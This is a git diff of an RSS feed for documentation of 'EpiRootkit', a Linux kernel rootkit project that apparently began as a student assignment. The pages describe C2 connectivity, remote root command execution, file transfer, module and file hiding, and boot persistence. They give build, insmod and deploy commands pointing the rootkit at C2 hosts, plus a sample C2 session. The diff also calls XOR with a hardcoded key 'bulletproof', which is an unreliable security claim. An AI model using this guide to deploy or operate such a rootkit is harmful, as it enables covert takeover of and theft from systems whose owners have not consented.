@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>EpiRootkit on Tux Fan Club Docs</title><link>/docs/05-epirootkit/</link><description>Recent content in EpiRootkit on Tux Fan Club Docs</description><generator>Hugo</generator><language>en</language><lastBuildDate>Fri, 30 May 2025 14:14:32 +0200</lastBuildDate><atom:link href="/docs/05-epirootkit/index.xml" rel="self" type="application/rss+xml"/><item><title>Configuration Justifications</title><link>/docs/05-epirootkit/configuration-justifications/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/05-epirootkit/configuration-justifications/</guid><description>&lt;h2 id="target-environment">Target Environment &lt;a href="#target-environment" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>EpiRootkit on Tux Fan Club Docs</title><link>/docs/05-epirootkit/</link><description>Recent content in EpiRootkit on Tux Fan Club Docs</description><generator>Hugo</generator><language>en</language><lastBuildDate>Fri, 30 May 2025 20:52:51 +0200</lastBuildDate><atom:link href="/docs/05-epirootkit/index.xml" rel="self" type="application/rss+xml"/><item><title>Configuration Justifications</title><link>/docs/05-epirootkit/configuration-justifications/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/05-epirootkit/configuration-justifications/</guid><description>&lt;h2 id="target-environment">Target Environment &lt;a href="#target-environment" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
 &lt;li>&lt;strong>OS&lt;/strong>: Ubuntu 20.04 LTS (Focal Fossa)&lt;/li>
 &lt;li>&lt;strong>Kernel&lt;/strong>: 5.4.0-26-generic&lt;/li>
 &lt;/ul>
@@ -33,11 +33,12 @@
  &lt;/div>
 &lt;p>&lt;strong>Result&lt;/strong>: 5.4.0 provides modern kernel features without the security restrictions that complicate rootkit development.&lt;/p></description></item><item><title>EpiRootkit Overview</title><link>/docs/05-epirootkit/overview/</link><pubDate>Sun, 25 May 2025 16:00:00 +0100</pubDate><guid>/docs/05-epirootkit/overview/</guid><description>&lt;h1 id="epirootkit">EpiRootkit &lt;a href="#epirootkit" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Linux kernel rootkit implementation for Ubuntu 20.04 LTS (kernel 5.4.0).&lt;/p>
 &lt;h2 id="features">Features &lt;a href="#features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
-&lt;li>&lt;strong>C2 Communication&lt;/strong>: TCP connection with domain support&lt;/li>
+&lt;li>&lt;strong>C2 Communication&lt;/strong>: TCP connection with domain support and XOR encryption&lt;/li>
 &lt;li>&lt;strong>DNS Resolution&lt;/strong>: Kernel-space domain name resolution&lt;/li>
 &lt;li>&lt;strong>Remote Commands&lt;/strong>: Execute shell commands with output capture&lt;/li>
 &lt;li>&lt;strong>File Transfer&lt;/strong>: Upload/download files between C2 and victim&lt;/li>
 &lt;li>&lt;strong>Authentication&lt;/strong>: SHA-512 password verification with rate limiting&lt;/li>
+&lt;li>&lt;strong>XOR Encryption&lt;/strong>: Simple, reliable 32-byte key encryption for all C2 traffic&lt;/li>
 &lt;li>&lt;strong>Stealth&lt;/strong>: Hide module from &lt;code>lsmod&lt;/code> and files from directory listings&lt;/li>
 &lt;li>&lt;strong>Persistence&lt;/strong>: Multiple mechanisms to survive reboots&lt;/li>
 &lt;/ul>
@@ -56,15 +57,15 @@
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="6abc97f" class="language-bash ">
- &lt;code># 1. Build and deploy
+ &lt;pre id="d709c00" class="language-bash ">
+ &lt;code># 1. Build and deploy with XOR encryption enabled
 cd rootkit &amp;amp;&amp;amp; make
 sudo ./deploy_rootkit.sh address=c2.example.com port=443
 
 # 2. Start C2 server 
 cd attacking_program &amp;amp;&amp;amp; pnpm start
 
-# 3. Use rootkit
+# 3. Use rootkit (all communication XOR encrypted)
 auth Client-1 password
 # SUCCESS: Authentication successful
 
@@ -73,12 +74,44 @@ exec Client-1 whoami
 # Output: root
 
 status Client-1
-# EpiRootkit Status: Version 1.0.0, Module Hidden: YES&lt;/code>
+# EpiRootkit Status: Version 1.0.0, Module Hidden: YES, Encryption: XOR&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;h2 id="core-components">Core Components &lt;a href="#core-components" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="network-layer">Network Layer &lt;a href="#network-layer" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
-&lt;li>&lt;strong>Connection Management&lt;/strong>: Persistent TCP with auto-reconnect&lt;/li>
-&lt;li>&lt;strong>DNS Resolution&lt;/strong>: See &lt;a data-bs-delay="{&amp;#34;hide&amp;#34;:300,&amp;#34;show&amp;#34;:550}" data-bs-html="true" data-bs-title="&lt;a href='/docs/05-epirootkit/features/dns-resolution/'>&lt;p>FEATURES&lt;/p></description></item><item><title>Build &amp; Deployment</title><link>/docs/05-epirootkit/deployment/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/05-epirootkit/deployment/</guid><description>&lt;h1 id="build--deployment">Build &amp;amp; Deployment &lt;a href="#build--deployment" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>How to build and deploy EpiRootkit on Ubuntu 20.04 with kernel 5.4.0.&lt;/p>
+&lt;h2 id="architecture">Architecture &lt;a href="#architecture" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="core-components">Core Components &lt;a href="#core-components" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
+&lt;li>&lt;strong>Network Layer&lt;/strong>: Connection management and DNS resolution&lt;/li>
+&lt;li>&lt;strong>Command System&lt;/strong>: Authentication and remote execution&lt;/li>
+&lt;li>&lt;strong>Stealth Features&lt;/strong>: Module and file hiding&lt;/li>
+&lt;li>&lt;strong>Persistence&lt;/strong>: Boot survival mechanisms&lt;/li>
+&lt;/ul>
+&lt;h3 id="communication-flow">Communication Flow &lt;a href="#communication-flow" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="3d8f7f0" class="language- ">
+ &lt;code>C2 Server ←→ Network/DNS ←→ EpiRootkit ←→ Linux Kernel
+(Node.js) (TCP/UDP) (Module) (System Calls)&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h2 id="technical-stack">Technical Stack &lt;a href="#technical-stack" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
+&lt;li>&lt;strong>Target&lt;/strong>: Ubuntu 20.04 LTS, kernel 5.4.0, x86_64&lt;/li>
+&lt;li>&lt;strong>Language&lt;/strong>: C (kernel module) + Node.js (C2 server)&lt;/li>
+&lt;li>&lt;strong>APIs&lt;/strong>: ftrace, kretprobe, VFS, UDP sockets&lt;/li>
+&lt;li>&lt;strong>Network&lt;/strong>: TCP (C2) + UDP (DNS resolution)&lt;/li>
+&lt;li>&lt;strong>Encryption&lt;/strong>: XOR cipher with 32-byte hardcoded key (bulletproof reliability)&lt;/li>
+&lt;li>&lt;strong>Authentication&lt;/strong>: SHA-512 with rate limiting (5 attempts/60s)&lt;/li>
+&lt;/ul>
+&lt;h2 id="configuration">Configuration &lt;a href="#configuration" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Edit &lt;code>rootkit/core/config.h&lt;/code>:&lt;/p></description></item><item><title>Build &amp; Deployment</title><link>/docs/05-epirootkit/deployment/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/05-epirootkit/deployment/</guid><description>&lt;h1 id="build--deployment">Build &amp;amp; Deployment &lt;a href="#build--deployment" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>How to build and deploy EpiRootkit on Ubuntu 20.04 with kernel 5.4.0.&lt;/p>
 &lt;h2 id="requirements">Requirements &lt;a href="#requirements" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="system">System &lt;a href="#system" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
 &lt;li>&lt;strong>OS&lt;/strong>: Ubuntu 20.04 LTS&lt;/li>
 &lt;li>&lt;strong>Kernel&lt;/strong>: 5.4.0-* (check with &lt;code>uname -r&lt;/code>)&lt;/li>
@@ -120,7 +153,7 @@ sudo apt install -y build-essential linux-headers-$(uname -r)&lt;/code>
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="2ae5558" class="language-c ">
+ &lt;pre id="6fe5c17" class="language-c ">
  &lt;code>// Option 1: Domain name (recommended)
 #define C2_SERVER_ADDRESS &amp;#34;jules-c2.example.com&amp;#34;
 #define C2_SERVER_PORT 4444
@@ -130,13 +163,13 @@ sudo apt install -y build-essential linux-headers-$(uname -r)&lt;/code>
 #define C2_SERVER_PORT 4444
 
 // Feature settings
-#define ENABLE_ENCRYPTION 0 // Encryption disabled
+#define ENABLE_ENCRYPTION 1 // XOR encryption enabled
 #define ENABLE_PERSISTENCE 1 // Auto-install persistence
 #define ENABLE_MODULE_HIDING 1 // Hide module by default
 #define ENABLE_FILE_HIDING 1 // Hide files with prefixes&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;h2 id="build-process">Build Process &lt;a href="#build-process" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+&lt;h2 id="build">Build &lt;a href="#build" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
 
 
  
@@ -151,18 +184,13 @@ sudo apt install -y build-essential linux-headers-$(uname -r)&lt;/code>
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="78aa9a7" class="language-bash ">
+ &lt;pre id="f9e9859" class="language-bash ">
  &lt;code>cd rootkit
 make clean &amp;amp;&amp;amp; make
-# ✓ Build successful: epirootkit.ko created
-
-# Verify build
-ls -la epirootkit.ko
-file epirootkit.ko
-# epirootkit.ko: ELF 64-bit LSB relocatable, x86-64&lt;/code>
+# ✓ Build successful: epirootkit.ko created&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;h2 id="deployment">Deployment &lt;a href="#deployment" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="method-1-deployment-script-recommended">Method 1: Deployment Script (Recommended) &lt;a href="#method-1-deployment-script-recommended" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+&lt;h2 id="deployment">Deployment &lt;a href="#deployment" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="quick-deploy-recommended">Quick Deploy (Recommended) &lt;a href="#quick-deploy-recommended" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
 
 
  
@@ -188,13 +216,86 @@ sudo ./deploy_rootkit.sh address=192.168.1.100 port=4444
 sudo ./deploy_rootkit.sh&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;p>&lt;strong>What it does:&lt;/strong>&lt;/p></description></item><item><title>Connection &amp; Authentication</title><link>/docs/05-epirootkit/connection-authentication/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/05-epirootkit/connection-authentication/</guid><description>&lt;h1 id="connection--authentication">Connection &amp;amp; Authentication &lt;a href="#connection--authentication" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>How EpiRootkit connects to the C2 server and handles authentication with &lt;strong>domain support&lt;/strong>.&lt;/p>
-&lt;h2 id="connection-process">Connection Process &lt;a href="#connection-process" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="automatic-connection">Automatic Connection &lt;a href="#automatic-connection" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>When the rootkit loads, it automatically:&lt;/p>
+&lt;h3 id="manual-loading">Manual Loading &lt;a href="#manual-loading" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="b5259ca" class="language-bash ">
+ &lt;code># Load with domain
+sudo insmod epirootkit.ko address=jules_chef_de_majeur.epirootkit.com
+
+# Load with IP
+sudo insmod epirootkit.ko address=192.168.1.100 port=4444
+
+# Load with defaults
+sudo insmod epirootkit.ko&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h2 id="management">Management &lt;a href="#management" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="check-status">Check Status &lt;a href="#check-status" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="ab56047" class="language-bash ">
+ &lt;code>sudo ./deploy_rootkit.sh status
+# Module Status: LOADED
+# Location: /lib/modules/5.4.0-74-generic/extra/epirootkit.ko
+# Autoload: ENABLED (/etc/modules-load.d/epirootkit.conf)
+# Connection: CONNECTED (c2.example.com:443)&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h3 id="complete-removal">Complete Removal &lt;a href="#complete-removal" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="5ba7b2a" class="language-bash ">
+ &lt;code>sudo ./deploy_rootkit.sh uninstall
+# ✓ Module unloaded
+# ✓ Autoload disabled
+# ✓ Module file removed
+# ✓ Dependencies updated&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;p>&lt;strong>Domain Support&lt;/strong>: The rootkit supports both domain names and IP addresses. For DNS resolution details, see &lt;a data-bs-delay="{&amp;#34;hide&amp;#34;:300,&amp;#34;show&amp;#34;:550}" data-bs-html="true" data-bs-title="&lt;a href='/docs/05-epirootkit/features/dns-resolution/'>&lt;p>FEATURES&lt;/p></description></item><item><title>Connection &amp; Authentication</title><link>/docs/05-epirootkit/connection-authentication/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/05-epirootkit/connection-authentication/</guid><description>&lt;h1 id="connection--authentication">Connection &amp;amp; Authentication &lt;a href="#connection--authentication" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>How EpiRootkit connects to the C2 server and handles authentication with &lt;strong>domain support&lt;/strong> and &lt;strong>XOR encryption&lt;/strong>.&lt;/p>
+&lt;h2 id="connection-process">Connection Process &lt;a href="#connection-process" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>When the rootkit loads, it automatically:&lt;/p>
 &lt;ol>
 &lt;li>&lt;strong>Starts connection thread&lt;/strong> (&lt;code>epirootkit_conn&lt;/code>)&lt;/li>
 &lt;li>&lt;strong>Resolves domain&lt;/strong> (if address is domain name) - see &lt;a data-bs-delay="{&amp;#34;hide&amp;#34;:300,&amp;#34;show&amp;#34;:550}" data-bs-html="true" data-bs-title="&lt;a href='/docs/05-epirootkit/features/dns-resolution/'>&lt;p>FEATURES&lt;/p>&lt;strong>DNS Resolution&lt;/strong>&lt;br>Kernel-space domain name resolution for flexible C2 connectivity&lt;/a>" data-bs-toggle="tooltip" href="/docs/05-epirootkit/features/dns-resolution/">DNS Resolution&lt;/a>&lt;/li>
 &lt;li>&lt;strong>Attempts TCP connection&lt;/strong> to configured C2 server&lt;/li>
 &lt;li>&lt;strong>Begins keepalive system&lt;/strong> (60-second ping/pong)&lt;/li>
+&lt;li>&lt;strong>Enables XOR encryption&lt;/strong> for all C2 communication&lt;/li>
 &lt;li>&lt;strong>Handles reconnection&lt;/strong> with exponential backoff&lt;/li>
 &lt;/ol>
 &lt;h3 id="configuration-with-domain-support">Configuration with Domain Support &lt;a href="#configuration-with-domain-support" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
